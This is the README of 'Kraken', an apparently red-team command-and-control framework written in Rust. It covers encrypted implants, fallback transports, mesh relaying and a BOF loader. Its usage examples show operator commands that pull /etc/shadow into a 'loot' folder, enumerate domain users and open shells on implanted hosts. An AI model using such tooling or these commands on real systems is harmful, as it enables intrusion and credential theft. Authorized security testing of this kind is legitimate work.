<div align="center">

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Kraken/main/docs/assets/logo-dark.svg">
  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Kraken/main/docs/assets/logo-light.svg">
  <img alt="Kraken" src="https://raw.githubusercontent.com/Real-Fruit-Snacks/Kraken/main/docs/assets/logo-dark.svg" width="520">
</picture>

![Rust](https://img.shields.io/badge/language-Rust-orange.svg)
![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows-lightgrey)
![License](https://img.shields.io/badge/license-MIT-blue.svg)

**OPSEC-first C2 framework built in Rust.**

Research-grade command and control with X25519 key exchange, AES-256-GCM encryption, modular implant architecture, mesh networking, and a ratatui TUI. Nine-crate Cargo workspace with explicit API boundaries.

> **Authorization Required**: Designed exclusively for authorized security testing with explicit written permission.

</div>

---

## Quick Start

**Prerequisites:** Rust 1.75+, protoc 3.20+, SQLite dev libraries

```bash
git clone https://github.com/Real-Fruit-Snacks/Kraken.git
cd Kraken
just setup && just proto && just build
```

**Start the teamserver:**

```bash
just server
# Listening on 0.0.0.0:50051 (gRPC) and 0.0.0.0:443 (HTTPS)
```

**Connect the operator TUI:**

```bash
just operator -- --server 127.0.0.1:50051
```

**Test with the implant simulator:**

```bash
just sim -- --server https://127.0.0.1:443 --interval 5
```

---

## Features

### Encrypted Communications

X25519 ECDH key exchange with HKDF-SHA256 key derivation. AES-256-GCM bulk encryption with per-message nonces and replay protection.

```bash
# Keys baked at compile time — no runtime key negotiation visible
just implant-linux-x64
```

### Multi-Transport

HTTP/HTTPS, TCP, SMB, and DNS with automatic fallback chains. Transport selection at compile time or runtime.

```bash
just implant-linux-x64  # HTTPS default
just implant-windows-x64  # Cross-compile for Windows
```

### Modular Implant

Minimal hardened core (~50KB) with capability modules loaded at runtime. Shell, file operations, SOCKS proxy, mesh relay, and BOF execution.

```bash
kraken> use shell
kraken> shell whoami
kraken> use file
kraken> download /etc/shadow ./loot/
```

### Mesh Networking

Peer discovery, relay routing, and topology computation. Implants communicate through each other when direct C2 is blocked.

```bash
kraken> mesh topology
kraken> mesh route implant-3 via implant-1,implant-2
```

### Operator TUI

Real-time ratatui interface with Catppuccin Mocha theming. Implant list, task queue, structured results, keybinding navigation.

```bash
just operator -- --server teamserver:50051
# Tab: switch panels | Enter: interact | /: search | q: quit
```

### BOF Compatibility

Rust COFF loader for the Beacon Object File ecosystem. Run existing BOFs without modification.

```bash
kraken> bof load ./SA-whoami.o
kraken> bof exec SA-whoami
```

### Task System

Typed task dispatch with structured results. Queue, track, and export across the implant network.

```bash
kraken> task queue shell "net user /domain"
kraken> task status
kraken> task export --format json
```

### Audit Logging

Append-only structured logs for every operation. Operator actions, implant events, and task results with timestamps and session context.

---

## Architecture

```
crates/
├── common/        # Shared traits (Module, Transport, CryptoProvider), ID types
├── crypto/        # X25519 ECDH, AES-256-GCM, HKDF-SHA256, Ed25519
├── protocol/      # Protobuf types and serialization (tonic/prost)
├── config/        # Compile-time configuration baking
├── db/            # SQLite via sqlx (PostgreSQL migration path)
├── server/        # Teamserver: gRPC services, HTTP listeners, audit
├── operator/      # TUI: ratatui, keybindings, real-time rendering
├── implant-core/  # Minimal kernel: check-in, dispatch, transport chains
└── implant-sim/   # Simulator for testing without real targets
```

Three-tier architecture: Operator (TUI + gRPC client) connects to Teamserver (gRPC + HTTP listener + SQLite) which manages Implants (minimal core + modules). All communication encrypted end-to-end.

---

## Platform Support

| | Linux | Windows | macOS |
|---|---|---|---|
| Teamserver | Full | Full | Full |
| Operator TUI | Full | Full | Full |
| Implant | Full | Full | Planned |
| Cross-compile | Native | MinGW | — |

---

## Security

Report vulnerabilities via [GitHub Security Advisories](https://github.com/Real-Fruit-Snacks/Kraken/security/advisories/new). See [SECURITY.md](SECURITY.md) for the full policy.

Kraken does **not** include:

- Ransomware, wiper, or destructive capabilities
- Supply chain attack tooling
- Automated mass exploitation

All implant configuration is baked at compile time — no command-line arguments, no environment variable lookups, no runtime artifacts.

---

## License

[MIT](LICENSE) — Copyright 2026 Real-Fruit-Snacks
